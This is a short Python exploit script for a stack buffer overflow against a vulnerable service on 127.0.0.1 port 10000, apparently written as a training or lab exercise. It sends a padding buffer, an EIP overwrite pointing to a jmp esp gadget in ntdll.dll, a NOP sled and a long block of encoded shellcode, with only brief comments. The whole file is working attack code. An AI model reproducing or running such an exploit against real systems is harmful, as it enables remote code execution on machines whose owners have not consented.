


import socket, sys

# connect to a socket on a vulnerable server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 10000))

# send A's
buf = b"A"*268

# overwrite EIP with address containing jmp esp instructions (inside ntdll.dll in my case)
buf += b"\x3F\xBB\xA6\x77"

#buf += b"B"*100  # Fill remaining space

buf += b"\x90" * 32  # NOP sled

buf += b"\xba\x1d\xca\x2f\xe6\xda\xd0\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xf6"
buf += b"\x36\xcd\x13\xf4\x2f\x90\xdc\x04\xb0\xf5\x55\xe1"
buf += b"\x81\x35\x01\x62\xb1\x85\x41\x26\x3e\x6d\x07\xd2"
buf += b"\xb5\x03\x80\xd5\x7e\xa9\xf6\xd8\x7f\x82\xcb\x7b"
buf += b"\xfc\xd9\x1f\x5b\x3d\x12\x52\x9a\x7a\x4f\x9f\xce"
buf += b"\xd3\x1b\x32\xfe\x50\x51\x8f\x75\x2a\x77\x97\x6a"
buf += b"\xfb\x76\xb6\x3d\x77\x21\x18\xbc\x54\x59\x11\xa6"
buf += b"\xb9\x64\xeb\x5d\x09\x12\xea\xb7\x43\xdb\x41\xf6"
buf += b"\x6b\x2e\x9b\x3f\x4b\xd1\xee\x49\xaf\x6c\xe9\x8e"
buf += b"\xcd\xaa\x7c\x14\x75\x38\x26\xf0\x87\xed\xb1\x73"
buf += b"\x8b\x5a\xb5\xdb\x88\x5d\x1a\x50\xb4\xd6\x9d\xb6"
buf += b"\x3c\xac\xb9\x12\x64\x76\xa3\x03\xc0\xd9\xdc\x53"
buf += b"\xab\x86\x78\x18\x46\xd2\xf0\x43\x0f\x17\x39\x7b"
buf += b"\xcf\x3f\x4a\x08\xfd\xe0\xe0\x86\x4d\x68\x2f\x51"
buf += b"\xb1\x43\x97\xcd\x4c\x6c\xe8\xc4\x8a\x38\xb8\x7e"
buf += b"\x3a\x41\x53\x7e\xc3\x94\xf4\x2e\x6b\x47\xb5\x9e"
buf += b"\xcb\x37\x5d\xf4\xc3\x68\x7d\xf7\x09\x01\x14\x02"
buf += b"\xda\xee\x41\xcd\x06\x87\x93\xcd\x27\x0c\x1d\x2b"
buf += b"\x2d\xa2\x4b\xe4\xda\x5b\xd6\x7e\x7a\xa3\xcc\xfb"
buf += b"\xbc\x2f\xe3\xfc\x73\xd8\x8e\xee\xe4\x28\xc5\x4c"
buf += b"\xa2\x37\xf3\xf8\x28\xa5\x98\xf8\x27\xd6\x36\xaf"
buf += b"\x60\x28\x4f\x25\x9d\x13\xf9\x5b\x5c\xc5\xc2\xdf"
buf += b"\xbb\x36\xcc\xde\x4e\x02\xea\xf0\x96\x8b\xb6\xa4"
buf += b"\x46\xda\x60\x12\x21\xb4\xc2\xcc\xfb\x6b\x8d\x98"
buf += b"\x7a\x40\x0e\xde\x82\x8d\xf8\x3e\x32\x78\xbd\x41"
buf += b"\xfb\xec\x49\x3a\xe1\x8c\xb6\x91\xa1\xbd\xfc\xbb"
buf += b"\x80\x55\x59\x2e\x91\x3b\x5a\x85\xd6\x45\xd9\x2f"
buf += b"\xa7\xb1\xc1\x5a\xa2\xfe\x45\xb7\xde\x6f\x20\xb7"
buf += b"\x4d\x8f\x61"
# send payload
sock.send(buf)
sock.close()